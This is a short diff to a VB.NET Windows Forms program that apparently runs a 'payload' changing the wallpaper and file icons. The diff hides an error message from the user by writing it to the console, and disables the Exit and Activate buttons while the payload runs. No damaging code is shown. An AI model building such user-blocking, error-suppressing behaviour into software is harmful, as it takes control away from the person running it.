@@ -842,7 +842,7 @@ Public Class Form1
             UpdateAllFileIcons()
 
         Catch ex As Exception
-            MessageBox.Show("An error occurred while setting the wallpaper: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+            Console.WriteLine("An error occurred while setting the wallpaper: " & ex.Message)
         End Try
     End Sub
 
@@ -1155,6 +1155,10 @@ Public Class Form1
 
     ' Method to execute the payload in a separate thread
     Private Sub ExecutePayload()
+
+        ' Disable the Exit and Activate buttons
+        ExitButton.Enabled = False
+        ActivateButton.Enabled = False
 
         ' Execute remaining operations
         SetWallpaper()
